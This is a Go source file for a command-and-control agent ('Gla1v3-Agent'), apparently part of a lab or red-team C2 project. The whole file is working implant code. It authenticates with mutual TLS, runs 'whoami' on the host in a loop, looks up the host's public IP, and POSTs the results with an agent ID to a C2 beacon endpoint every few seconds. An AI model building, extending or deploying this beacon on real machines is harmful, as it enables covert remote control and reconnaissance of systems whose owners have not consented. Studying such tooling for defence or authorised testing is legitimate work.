package main

import (
	"bytes"
	"context"
	"crypto/tls"
	"crypto/x509"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"
)

func main() {
	// Cert paths (configurable)
	// Resolve cert/key pair. Prefer env vars; otherwise try common repo filenames so a
	// fresh clone + `generate_session_certs.sh` will be found without extra configuration.
	certEnv := os.Getenv("AGENT_CERT_PATH")
	keyEnv := os.Getenv("AGENT_KEY_PATH")

	tryPairs := [][]string{}
	if certEnv != "" && keyEnv != "" {
		tryPairs = append(tryPairs, []string{certEnv, keyEnv})
	}
	// repo-local candidates (relative to agents-go)
	tryPairs = append(tryPairs, [][]string{
		{"../certs/agent-client.crt", "../certs/agent-client.key"},
		{"../certs/agent.crt", "../certs/agent.key"},
		{"../certs/server.crt", "../certs/server.key"},
	}...)

	var cert tls.Certificate
	var loadedCertPath, loadedKeyPath string
	var loadErr error
	attempted := []string{}
	for _, p := range tryPairs {
		attempted = append(attempted, p[0]+"|"+p[1])
		if _, err := os.Stat(p[0]); err != nil {
			continue
		}
		if _, err := os.Stat(p[1]); err != nil {
			continue
		}
		cert, loadErr = tls.LoadX509KeyPair(p[0], p[1])
		if loadErr == nil {
			loadedCertPath = p[0]
			loadedKeyPath = p[1]
			break
		}
	}
	if loadErr != nil {
		log.Fatalf("Failed to load any agent cert/key pair. Attempts: %v. Last error: %v", attempted, loadErr)
	}
	log.Printf("Loaded agent cert/key: %s , %s", loadedCertPath, loadedKeyPath)

	// 2. Load CA so we trust the server (fatal if missing)
	caPath := os.Getenv("AGENT_CA_PATH")
	if caPath == "" {
		caPath = "../certs/ca.crt"
	}

	caCert, err := os.ReadFile(caPath)
	if err != nil {
		log.Fatal("Failed to read CA cert:", err)
	}
	caCertPool := x509.NewCertPool()
	if !caCertPool.AppendCertsFromPEM(caCert) {
		log.Fatal("Failed to append CA cert to pool")
	}

	// Server names
	serverName := os.Getenv("AGENT_SERVER_NAME")
	if serverName == "" {
		serverName = "c2.gla1v3.local"
	}
	apiServerName := os.Getenv("AGENT_API_SERVER_NAME")
	if apiServerName == "" {
		apiServerName = "api.gla1v3.local"
	}

	// 3. mTLS config (required by default)
	tlsConfig := &tls.Config{
		Certificates: []tls.Certificate{cert},
		RootCAs:      caCertPool,
		ServerName:   serverName,
		MinVersion:   tls.VersionTLS12,
	}

	client := &http.Client{
		Transport: &http.Transport{TLSClientConfig: tlsConfig},
		Timeout:   10 * time.Second,
	}

	// Separate TLS config for API (whoami) requests: trust same CA but use API servername
	// API TLS: also present client cert for mTLS to API
	apiTLS := &tls.Config{
		Certificates: []tls.Certificate{cert},
		RootCAs:      caCertPool,
		ServerName:   apiServerName,
		MinVersion:   tls.VersionTLS12,
	}

	whoamiClient := &http.Client{
		Transport: &http.Transport{TLSClientConfig: apiTLS},
		Timeout:   6 * time.Second,
	}

	whoamiToken := os.Getenv("AGENT_WHOAMI_TOKEN")

	// 4. Beacon loop with whoami execution and JSON POST
	agentID := "agent-" + fmt.Sprintf("%d", time.Now().UnixNano())

	// Configurable via env
	c2URL := os.Getenv("C2_URL")
	if c2URL == "" {
		c2URL = "https://c2.gla1v3.local:4443/beacon"
	}
	beaconInterval := 8 * time.Second
	if v := os.Getenv("BEACON_INTERVAL_SEC"); v != "" {
		if iv, err := time.ParseDuration(v + "s"); err == nil {
			beaconInterval = iv
		}
	}

	// Limits
	const cmdTimeout = 3 * time.Second
	const maxOutput = 2048

	seq := 0
	for {
		seq++

		// Run whoami with timeout
		ctx, cancel := context.WithTimeout(context.Background(), cmdTimeout)
		cmd := exec.CommandContext(ctx, "whoami")
		outBytes, err := cmd.Output()
		cancel()

		output := ""
		errStr := ""
		if err != nil {
			// include stderr if possible
			if ee, ok := err.(*exec.ExitError); ok {
				errStr = strings.TrimSpace(string(ee.Stderr))
			} else {
				errStr = err.Error()
			}
			log.Printf("whoami failed: %v", err)
		}
		if len(outBytes) > 0 {
			output = strings.TrimSpace(string(outBytes))
			if len(output) > maxOutput {
				output = output[:maxOutput] + "...(truncated)"
			}
		}

		// Build structured payload
		payload := map[string]interface{}{
			"agent_id": agentID,
			"seq":      seq,
			"output":   output,
			"error":    errStr,
			"ts":       time.Now().UTC().Format(time.RFC3339),
		}

		// Attempt to learn public IP via secure whoami endpoint on the API
		if whoamiToken != "" {
			func() {
				req, _ := http.NewRequest("GET", "https://api.gla1v3.local/whoami", nil)
				req.Header.Set("Authorization", "Bearer "+whoamiToken)
				req.Header.Set("User-Agent", "Gla1v3-Agent/0.1 whoami")
				resp, err := whoamiClient.Do(req)
				if err != nil {
					log.Printf("whoami request failed: %v", err)
					return
				}
				defer resp.Body.Close()
				if resp.StatusCode != 200 {
					log.Printf("whoami non-200: %s", resp.Status)
					return
				}
				var j struct {
					IP string `json:"ip"`
				}
				if err := json.NewDecoder(resp.Body).Decode(&j); err != nil {
					log.Printf("whoami decode failed: %v", err)
					return
				}
				if j.IP != "" {
					payload["publicIp"] = j.IP
					log.Printf("whoami -> publicIp: %s", j.IP)
				}
			}()
		}

		bodyBytes, jerr := json.Marshal(payload)
		if jerr != nil {
			log.Printf("Failed to marshal beacon payload: %v", jerr)
			time.Sleep(beaconInterval)
			continue
		}

		req, rerr := http.NewRequest("POST", c2URL, bytes.NewReader(bodyBytes))
		if rerr != nil {
			log.Printf("Failed to create request: %v", rerr)
			time.Sleep(beaconInterval)
			continue
		}
		req.Header.Set("User-Agent", "Gla1v3-Agent/0.1")
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("X-Agent-ID", agentID)

		resp, derr := client.Do(req)
		if derr != nil {
			log.Printf("Beacon POST failed: %v", derr)
		} else {
			log.Printf("Beacon POST -> %s | Agent-ID: %s | seq=%d", resp.Status, agentID, seq)
			resp.Body.Close()
		}

		time.Sleep(beaconInterval)
	}
}
